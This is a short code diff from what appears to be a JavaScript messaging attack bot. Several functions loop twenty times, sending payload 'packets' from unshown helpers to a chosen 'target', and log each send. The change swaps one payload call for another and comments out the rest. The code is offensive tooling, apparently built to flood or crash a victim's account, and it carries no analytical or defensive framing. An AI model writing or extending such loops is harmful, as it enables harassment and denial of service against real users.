@@ -808,7 +808,8 @@ async function AB2(sock, target, mention) {
 
 async function BB(sock, target) {
     for (let i = 0; i < 20; i++) {
-        await AB1(sock, target)
+        await F(sock, target)
+        //await AB1(sock, target)
         B(sock, target)
         await B(sock, target)
         console.log(`${i} BB Packet To ${target}`)
@@ -816,7 +817,7 @@ async function BB(sock, target) {
 }
 async function BB1(sock, target) {
     for (let i = 0; i < 20; i++) {
-        await AB1(sock, target)
+        //await AB1(sock, target)
         B1(sock, target)
         await B1(sock, target)
         console.log(`${i} BB1 Packet To ${target}`)
@@ -824,7 +825,7 @@ async function BB1(sock, target) {
 }
 async function BG2(sock, target) {
     for (let i = 0; i < 20; i++) {
-        await AB1(sock, target)
+        //await AB1(sock, target)
         G2(sock, target)
         await G2(sock, target)
         console.log(`${i} BG2 Packet To ${target}`)
@@ -832,7 +833,7 @@ async function BG2(sock, target) {
 }
 async function BH3(sock, target) {
     for (let i = 0; i < 20; i++) {
-        await AB1(sock, target)
+        //await AB1(sock, target)
         H3(sock, target)
         await H3(sock, target)
         console.log(`${i} BH3 Packet To ${target}`)
